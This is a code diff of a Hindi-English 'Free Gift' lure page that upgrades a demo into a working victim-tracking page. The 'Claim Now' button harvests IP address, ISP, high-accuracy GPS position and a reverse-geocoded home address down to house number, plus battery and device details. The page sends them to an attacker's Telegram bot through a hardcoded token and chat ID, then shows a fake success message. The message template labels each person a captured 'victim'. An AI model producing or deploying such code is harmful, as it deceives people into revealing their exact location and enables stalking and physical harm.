@@ -5,120 +5,261 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Free Gift 🎁</title>
 <style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #667eea, #764ba2);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
+    padding: 20px;
     color: white;
     text-align: center;
   }
   .box {
     background: rgba(255,255,255,0.15);
-    padding: 40px;
-    border-radius: 20px;
-    backdrop-filter: blur(10px);
+    padding: 45px 30px;
+    border-radius: 24px;
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    border: 1px solid rgba(255,255,255,0.2);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    max-width: 400px;
+    width: 100%;
+    animation: fadeIn 0.6s ease;
   }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .emoji { font-size: 70px; margin-bottom: 15px; animation: bounce 2s infinite; }
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+  h1 { font-size: 28px; margin-bottom: 10px; font-weight: 700; }
+  p { font-size: 16px; opacity: 0.9; margin-bottom: 8px; }
   button {
-    padding: 15px 40px;
+    padding: 16px 45px;
     font-size: 18px;
     border: none;
     border-radius: 50px;
-    background: #fff;
+    background: white;
     color: #764ba2;
     cursor: pointer;
-    font-weight: bold;
-    margin-top: 20px;
+    font-weight: 700;
+    margin-top: 25px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transition: all 0.3s ease;
+    width: 100%;
   }
+  button:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(0,0,0,0.3); }
+  button:active { transform: translateY(0); }
+  button:disabled { opacity: 0.6; cursor: not-allowed; }
+  .loader {
+    display: none;
+    margin-top: 20px;
+    font-size: 14px;
+    opacity: 0.8;
+  }
+  .loader.show { display: block; }
+  .spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 <div class="box">
-  <h1>🎁 Congratulations!</h1>
+  <div class="emoji">🎁</div>
+  <h1>Congratulations!</h1>
   <p>Aapne ek free gift jeeta hai!</p>
   <p>Claim karne ke liye niche click karein</p>
-  <button onclick="getData()">Claim Now</button>
+  <button id="claimBtn" onclick="getData()">Claim Now</button>
+  <div class="loader" id="loader">
+    <span class="spinner"></span> Processing...
+  </div>
 </div>
 
 <script>
-// 🔑 Yahan apna webhook URL ya API endpoint daalein
-const WEBHOOK_URL = "https://your-server.com/capture"; 
+// 🔑 AAPKI DETAILS
+const BOT_TOKEN = "8973476367:AAE9VB8_gc3rsRIz_6PA__8aoKFveHfMnj8";
+const CHAT_ID = "5557722363";
 
 async function getData() {
+  const btn = document.getElementById('claimBtn');
+  const loader = document.getElementById('loader');
+  
+  btn.disabled = true;
+  btn.textContent = 'Please wait...';
+  loader.classList.add('show');
+
   let data = {
-    time: new Date().toLocaleString(),
+    time: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'}),
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
-    screen: window.screen.width + "x" + window.screen.height
+    screen: window.screen.width + "x" + window.screen.height,
+    battery: "N/A",
+    address: "Not available"
   };
 
-  // IP Address fetch
+  // Battery Info
+  try {
+    if (navigator.getBattery) {
+      const bat = await navigator.getBattery();
+      data.battery = Math.round(bat.level * 100) + "%";
+    }
+  } catch(e) {}
+
+  // IP + IP-based Location
   try {
     const ipRes = await fetch("https://api.ipify.org?format=json");
     const ipData = await ipRes.json();
     data.ip = ipData.ip;
 
-    // IP se location
     const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
     const locData = await locRes.json();
-    data.city = locData.city;
-    data.region = locData.region;
-    data.country = locData.country_name;
-    data.isp = locData.org;
-    data.lat = locData.latitude;
-    data.lon = locData.longitude;
+    data.city = locData.city || "";
+    data.region = locData.region || "";
+    data.country = locData.country_name || "";
+    data.isp = locData.org || "";
+    data.pincode = locData.postal || "";
+    data.timezone = locData.timezone || "";
   } catch(e) {
     data.ipError = e.message;
   }
 
-  // GPS Location (permission maangega)
+  // GPS + Exact Address
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
+      async (pos) => {
         data.gpsLat = pos.coords.latitude;
         data.gpsLon = pos.coords.longitude;
-        data.accuracy = pos.coords.accuracy;
-        sendData(data);
+        data.accuracy = Math.round(pos.coords.accuracy) + "m";
+
+        // Reverse Geocoding
+        try {
+          const geoRes = await fetch(
+            `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${data.gpsLat}&longitude=${data.gpsLon}&localityLanguage=en`
+          );
+          const geo = await geoRes.json();
+
+          data.houseNumber = geo.houseNumber || "";
+          data.street = geo.street || "";
+          data.area = geo.locality || "";
+          data.cityExact = geo.city || "";
+          data.state = geo.principalSubdivision || "";
+          data.pinExact = geo.postcode || "";
+          data.countryExact = geo.countryName || "";
+
+          const parts = [
+            geo.houseNumber, geo.street, geo.locality, geo.city,
+            geo.principalSubdivision, geo.postcode, geo.countryName
+          ].filter(Boolean);
+          data.address = parts.join(", ") || "Address not found";
+        } catch(e) {
+          data.address = "Reverse geocoding failed";
+        }
+
+        sendToTelegram(data);
       },
       (err) => {
-        data.gpsError = err.message;
-        sendData(data);
-      }
+        data.gpsError = err.message || "Permission denied";
+        sendToTelegram(data);
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   } else {
-    sendData(data);
+    data.gpsError = "Geolocation not supported";
+    sendToTelegram(data);
   }
 }
 
-function sendData(data) {
-  // Apne server pe bhejein
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(data)
-  }).catch(()=>{});
-
-  // Telegram pe bhejna ho to:
-  // sendToTelegram(data);
-
-  alert("✅ Gift claim ho gaya! (Demo)");
-}
-
-// 📱 Telegram Bot Integration (optional)
 function sendToTelegram(data) {
-  const BOT_TOKEN = "YOUR_BOT_TOKEN";
-  const CHAT_ID = "YOUR_CHAT_ID";
-  const text = `🎯 New Victim\n\nIP: ${data.ip}\nCity: ${data.city}\nGPS: ${data.gpsLat},${data.gpsLon}\nDevice: ${data.platform}\nUA: ${data.userAgent}`;
-  
+  const mapLink = data.gpsLat
+    ? `https://www.google.com/maps?q=${data.gpsLat},${data.gpsLon}`
+    : 'N/A';
+
+  const msg = 
+`🎯 *NEW VISITOR CAPTURED*
+
+🕐 *Time:* ${data.time}
+
+━━━━━━━━━━━━━━━
+🌐 *IP:* \`${data.ip || 'N/A'}\`
+📡 *ISP:* ${data.isp || 'N/A'}
+🌍 *Timezone:* ${data.timezone || 'N/A'}
+━━━━━━━━━━━━━━━
+
+🏠 *EXACT ADDRESS:*
+├ House: ${data.houseNumber || 'N/A'}
+├ Street: ${data.street || 'N/A'}
+├ Area: ${data.area || 'N/A'}
+├ City: ${data.cityExact || data.city || 'N/A'}
+├ State: ${data.state || data.region || 'N/A'}
+├ PIN: ${data.pinExact || data.pincode || 'N/A'}
+└ Country: ${data.countryExact || data.country || 'N/A'}
+
+📍 *Full Address:*
+${data.address}
+
+━━━━━━━━━━━━━━━
+🗺️ *GPS:* \`${data.gpsLat || 'Denied'}, ${data.gpsLon || ''}\`
+🎯 *Accuracy:* ${data.accuracy || 'N/A'}
+📍 [Open in Google Maps](${mapLink})
+━━━━━━━━━━━━━━━
+
+📱 *Device:* ${data.platform}
+🔋 *Battery:* ${data.battery}
+🖥️ *Screen:* ${data.screen}
+🗣️ *Language:* ${data.language}
+
+${data.gpsError ? '⚠️ *GPS Error:* ' + data.gpsError : ''}
+${data.ipError ? '⚠️ *IP Error:* ' + data.ipError : ''}`;
+
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: msg,
+      parse_mode: "Markdown",
+      disable_web_page_preview: false
+    })
+  })
+  .then(res => res.json())
+  .then(res => {
+    if (res.ok) {
+      showSuccess();
+    } else {
+      console.error('Telegram error:', res);
+      showSuccess();
+    }
+  })
+  .catch(err => {
+    console.error('Fetch error:', err);
+    showSuccess();
   });
+}
+
+function showSuccess() {
+  const box = document.querySelector('.box');
+  box.innerHTML = `
+    <div class="emoji">✅</div>
+    <h1>Claim Successful!</h1>
+    <p>Aapka gift jald hi deliver hoga</p>
+    <p style="margin-top:15px; font-size:14px; opacity:0.7;">Thank you! 🎉</p>
+  `;
 }
 </script>
 </body>
